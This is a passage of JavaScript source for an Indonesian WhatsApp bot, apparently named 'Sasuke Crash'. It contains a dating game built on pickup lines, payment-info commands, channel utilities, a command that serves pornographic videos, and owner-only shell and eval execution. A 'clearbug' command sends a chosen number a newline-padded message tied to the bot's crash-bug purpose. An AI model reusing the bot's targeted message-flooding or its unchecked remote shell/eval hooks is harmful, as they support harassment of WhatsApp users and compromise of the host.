cinta sama aku. kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. aku ingin kamu selalu bersamaku. aku mencintaimu.", "kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. maukah kamu jadi pacar aku?", "kamu kenal iwan nggak? iwan to be your boy friend.", "kamu mau nggak jadi matahari di kehidupanku? kalau mau, menjauhlah 149.6 juta km dari aku sekarang!", "kamu nggak capek hts-an sama aku? aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. kita pacaran aja, yuk?", "kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. iya, aku.", "kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. apakah kamu akan membiarkan aku menjadi orangnya?", "kamu tahu enggak kenapa aku ngambil jurusan elektro? karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "kamu tahu kenapa hari ini aku menyatakan semua ini padamu? karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "ketika aku bertemu denganmu, aku tak peduli dengan semuanya. namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. dan apakah ini cinta?", "ketika engkau memandangku, engkau akan melihat fisikku. tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "ketika hawa tercipta buat sang adam, begitu indah kehidupan mereka. izinkan aku menjadi sang adam/hawa buatmu karena aku sangat mencintaimu.", "ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "kita udah saling tahu masa lalu masing-masing. tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. resah jika kamu tak menjadi milikku selamanya.", "lebih spesial dari nasi goreng, lebih indah dari purnama. ya, jika kamu yang temani akhir hidupku.", "maaf sebelumnya karena cuma bisa bilang lewat wa. sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. mau?", "makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "makan tahu bumbu petis. merenung sambil makan buah duku. aku bukan lelaki yang romantis. namun, maukah kau jadi pacarku?", "makasih, ya, selama ini sudah mau temani aku. entah itu dalam suka ataupun duka. tapi sekarang aku mau kamu berubah. aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "mau jadi pacarku nggak, lagi gabut nih. coba dulu 1 bulan kalau nyaman lanjut deh.", "menjadi teman memang menyenangkan. akan lebih membahagiakan jika kamu menjadi milikku.", "meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - zarry hendrik", "meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "mungkin aku bukan obama, tapi aku senang kalau bisa manggil kamu, o sayang. kamu mau nggak mulai saat ini aku panggil seperti itu?", "mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. tapi satu yang aku sanggup, membuatmu bahagia. izinkan aku membuktikannya, ya!", "neng, bakar-bakaran yuk! | bakar apa? | kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "nggak perlu basa basi. kita udah kenal lama, aku suka kamu apa adanya. jadian yuk!", "pepatah mengatakan, empat sehat lima sempurna. namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "saatnya aku mengungkapkan perasaan yang terdalam kepadamu. aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "saking jatuh cintanya aku sama kamu. mendengar kamu kentut aja aku sudah bahagia.", "satu tambah satu sama dengan dua. aku tanpamu nggak bisa apa-apa. satu dua tiga sepuluh. aku maunya kamu jadi pacarku.", "secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "sejak kenal kamu, bawaannya pengin belajar terus. belajar jadi yang terbaik. untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "senjata bertuah amatlah sakti. kalah oleh iman nan hakiki. maukah kau jadi orang yang aku kasihi? aku janji cintaku sampai mati.", "seseorang bermimpi tentangmu setiap malam. seseorang tidak bisa bernapas tanpamu, kesepian. seseorang berharap suatu hari kau akan melihatnya. seseorang itu adalah aku.", "setelah hari berlalu, aku yakin kamu pilihanku.", "setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. aku mencintaimu.", "suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. perempuan itu adalah kamu.", "suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. itu adalah kamu.", "telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. karena aku mau kamu jadi pacar aku?", "tidak peduli seberapa sederhanya dan ketidakjelasan kamu. tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. aku mau kamu jadi pacarku.", "untuk apa memajang foto berdua? yang aku mau fotomu ada dalam buku nikahku kelak. maukah kamu jadi pacarku?"
                    ];
                    let katakata = await pickRandom(ktnmbk)
                    let teks = `love Message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${users.split("@")[0]}\n\n"${katakata}"`
                    langgxyz.jadian[users] = [
                        ErlanggaReply(),
                        m.sender
                    ]
                    let hehe = `kamu baru saja mengajak @${users.split("@")[0]} jadian\n\n@${users.split("@")[0]} silahkan beri keputusan🎉\n${prefix}terima atau ${prefix}tolak`
                    langgxyz.sendMessage(m.chat, {
                        text: hehe,
                        footer: "© Erlangga Official - 2025",
                        buttons: [
                            {
                                buttonId: `${prefix}terima`,
                                buttonText: {
                                    displayText: 'terima'
                                }, type: 1
                            },
                            {
                                buttonId: `${prefix}tolak`,
                                buttonText: {
                                    displayText: 'ogah'
                                }, type: 1
                            }
                        ],
                        headerType: 1,
                        viewOnce: true
                    }, { quoted: qmime })
                }
            }
                break        
                case 'terima': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (langgxyz.jadian[m.sender]) {
                    let user = langgxyz.jadian[m.sender][1]
                    global.db.data.users[user].pacar = m.sender
                    global.db.data.users[m.sender].pacar = user
                    ErlanggaReply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
                    delete langgxyz.jadian[m.sender]
                } else {
                    ErlanggaReply("anjirr?")
                }
            }
                break

            case 'tolak': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (langgxyz.jadian[m.sender]) {
                    let user = langgxyz.jadian[m.sender][1]
                    ErlanggaReply(`@${user.split("@")[0]} wowkaowka di tolak`)
                    delete langgxyz.jadian[m.sender]
                } else {
                    ErlanggaReply("anjirr?")
                }
            }
                break

            case 'putus': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                let pasangan = global.db.data.users[m.sender].pacar
                if (pasangan) {
                    global.db.data.users[m.sender].pacar = ""
                    global.db.data.users[pasangan].pacar = ""
                    ErlanggaReply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
                } else {
                    ErlanggaReply("anjirr?")
                }
            }
                break

            case 'cekpacar': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                try {
                    let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
                    if (!user) return ErlanggaReply(`tag/ErlanggaReply seseorang, contoh: ${prefix + command} @628888`)
                    let pasangan = global.db.data.users[user].pacar
                    if (pasangan) {
                        ErlanggaReply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
                    } else {
                        ErlanggaReply(`@${user.split("@")[0]} masih jomblo`)
                    }
                } catch (error) {
                    let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
                    ErlanggaReply(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
                }
            }
                break
                case "danapay": {
if (global.dana == false) return ErlanggaReply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}
*A/N :* ${global.namadana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
langgxyz.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}
*A/N :* ${global.namaovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
langgxyz.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return ErlanggaReply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}
*A/N :* ${global.namagopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
langgxyz.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (global.qris == false) return ErlanggaReply('Payment Qris Tidak Tersedia')
m.reply('Memproses Mengambil QRIS, Tunggu Sebentar . . .')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*
_WAJIB TAMBAH 500P KALAU PAKAI QRIS_
*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
langgxyz.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break
case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://nabzxbotz.biz.id/ai/openai?text=" + talk).then(async (res) => {
await ErlanggaReply(res.result)
}).catch(e => m.reply(e.toString()))
}
break 
               case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await langgxyz.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await langgxyz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "buatgc": {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply("nama grup")
let res = await langgxyz.groupCreate(q, [])
const urlGrup = "https://chat.whatsapp.com/" + await langgxyz.groupInviteCode(res.id)
let teks = `
*Grup WhatsApp Berhasil Dibuat ✅*
${urlGrup}
`
return ErlanggaReply(teks)
}
break
case "bot":{
ErlanggaReply(`Sasuke Crash Aktif Selama: *${runtime(process.uptime())}*`)
}
break;
      case 'clearbug': {
if (!isCreator) return ErlanggaReply(" Khusus Premium ")
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
langgxyz.sendMessage(target, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug Bang Erlanggaaa")
}
break           
case 'bokep':{
if (!isCreator && !isPremium) return Reply(mess.owner)
const caption = `Sange Lu Cill?`;
let heyy
if (/bokep/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/okep')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

			langgxyz.sendMessage(m.chat,{
			 video: {url:yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `© Erlangga Ned Tobrut`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.menu`, 

							buttonText: {
								displayText: "back menu"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: PayX
				});
			}
			//D|ts si pler 🐎
break         
case "motivasi":
case "quotes-motivasi":
case "motivasi-quotes": {
let motivasii = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/quotes/motivasi.json');
let quotesmotivasi = motivasii[Math.floor(Math.random() * motivasii.length)];
langgxyz.sendMessage(m.chat,{
			 image: {url: "https://img12.pixhost.to/images/1502/585103551_erlangga.jpg"},
 //renderLargerThumbnail: true,
					caption: quotesmotivasi,
					footer: `> Erlangga Mode Albert Einstein`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.menu`, 

							buttonText: {
								displayText: "back menu"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: PayX
				});
    await langgxyz.sendMessage(m.chat, {audio: fs.readFileSync('./assest/allmedia/AbsoluteCinema.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
			}
			//D|ts si pler 🐎
break
case 'reactch': {
    if (!args[0] || !isCreator) {
        return ErlanggaReply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/xxxx halo dunia");
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return m.reply("Link tautan tidak valid.");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await langgxyz.newsletterMetadata("invite", channelId);
        await langgxyz.newsletterReactMessage(res.id, messageId, emoji);

        return ErlanggaReply(`Berhasil mengirim reaction *${emoji}* ke pesan di channel *${res.name}*`);
    } catch (e) {
        console.error(e);
        return ErlanggaReply("Gagal mengirim reaction. Pastikan link dan emoji valid.");
    }
};
break
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return ErlanggaReply(err)
                        if (stdout) return ErlanggaReply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await ErlanggaReply(evaled);
                    } catch (err) {
                        ErlanggaReply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await ErlanggaReply(require('util').format(teks))
                    }
                }
        
        }
  } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
